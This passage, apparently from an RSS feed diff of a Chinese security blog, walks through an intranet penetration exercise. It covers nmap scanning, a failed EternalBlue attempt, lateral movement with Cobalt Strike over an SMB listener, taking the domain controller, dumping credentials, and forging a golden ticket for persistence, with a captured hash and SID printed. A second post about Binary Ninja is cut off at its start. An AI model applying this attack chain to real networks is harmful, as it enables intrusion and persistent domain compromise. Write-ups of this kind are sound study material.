+&lt;p>接下来挂代理用nmap扫端口&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69krsz0tj30qs0jotg4.jpg"
+loading="lazy"
+alt="image-20260615182558002"
+>&lt;/p>
+&lt;p>开放了445端口，我们尝试使用永恒之蓝进行探测&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69krngdtj318v06r0yv.jpg"
+loading="lazy"
+alt="image-20260615185411472"
+>&lt;/p>
+&lt;p>但利用失败，所以我们转用CS来进行横向&lt;/p>
+&lt;p>凭证提权—&amp;gt;抓取明文密码&lt;/p>
+&lt;p>刚刚我们端口扫描的时候发现开放了445端口，可以创建SMB监听隧道。&lt;/p>
+&lt;ol>
+&lt;li>SMB监听隧道的核心原理是利用SMB协议在目标主机上建立隐蔽的通信通道，绕过传统防火墙和入侵检测系统的监控。&lt;/li>
+&lt;li>SMB协议基础：文件共享，域名解析等，默认通过445端口通信&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kr2kmkj30iy0pp40k.jpg"
+loading="lazy"
+alt="image-20260615195650994"
+>&lt;/p>
+&lt;p>切换攻击目标列表&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kqz2m0j30sf04igmk.jpg"
+loading="lazy"
+alt="image-20260615195735390"
+>&lt;/p>
+&lt;p>添加 用户名 密码 域名 -&amp;gt; 监听器 -&amp;gt; 对端连接的隧道&lt;/p>
+&lt;p>监听器选择我们刚刚创建的SMB监听器，对端连接的隧道选择system权限的&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69kritjnj30uq0nrn52.jpg"
+loading="lazy"
+alt="image-20260615195331163"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69krcbdoj31ye1097kc.jpg"
+loading="lazy"
+alt="image-20260615195508048"
+>&lt;/p>
+&lt;p>横向成功，进入域控&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kqv9k8j314x0sqn2j.jpg"
+loading="lazy"
+alt="image-20260615200425757"
+>&lt;/p>
+&lt;p>现在已经控制域控了&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69kqp0awj30tb0v810v.jpg"
+loading="lazy"
+alt="image-20260615200700664"
+>&lt;/p>
+&lt;p>也可以考虑做权限维持&lt;/p>
+&lt;p>黄金票据是指能够绕过认证授权机制并获得所需权限的票据。这种票据可以被攻击者收集和利用，从而从系统内部获取高权限，甚至完全控制系统。&lt;/p>
+&lt;ol>
+&lt;li>抓取 Hash 还有明文密码&lt;/li>
+&lt;/ol>
+&lt;p>把SID，域名，复制下来等下黄金票据要用&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kqgc92j30x60e6n3d.jpg"
+loading="lazy"
+alt="image-20260615200838397"
+>&lt;/p>
+&lt;p>hash：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">58e91a5ac358d86513ab224312314061:::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kq9ne2j30uc0jon11.jpg"
+loading="lazy"
+alt="image-20260615200950623"
+>&lt;/p>
+&lt;p>SID：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>2.黄金票据配置&lt;/p>
+&lt;p>凭证提权—&amp;gt;黄金票据&lt;/p>
+&lt;p>把刚刚复制的域名，SID，hash粘贴上去，用户名随便&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kq4lw5j30f20almz5.jpg"
+loading="lazy"
+alt="image-20260615201124440"
+>&lt;/p>
+&lt;p>成功&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kq0b2tj31y90nfqaz.jpg"
+loading="lazy"
+alt="image-20260615201142821"
+>&lt;/p></description></item><item><title>如何使用Binary ninja逆向</title><link>https://Oight.github.io/p/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8binary-ninja%E9%80%86%E5%90%91/</link><pubDate>Sun, 24 May 2026 10:29:47 +0800</pubDate><guid>https://Oight.github.io/p/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8binary-ninja%E9%80%86%E5%90%91/</guid><description>&lt;h1 id="如何使用binary-ninja逆向">如何使用Binary ninja逆向
 &lt;/h1>&lt;p>以前一直使用的是IDA，一时兴起尝试了下Binary ninja 发现使用起来还不错，和IDA结合起来使用或许会有不错的成效&lt;/p>
 &lt;p>这篇将以MoeCTF2023 中的一部分逆向题为例，来介绍一下Binary Ninja的使用方法&lt;/p>
 &lt;h3 id="rrrrrc4">RRRRRc4
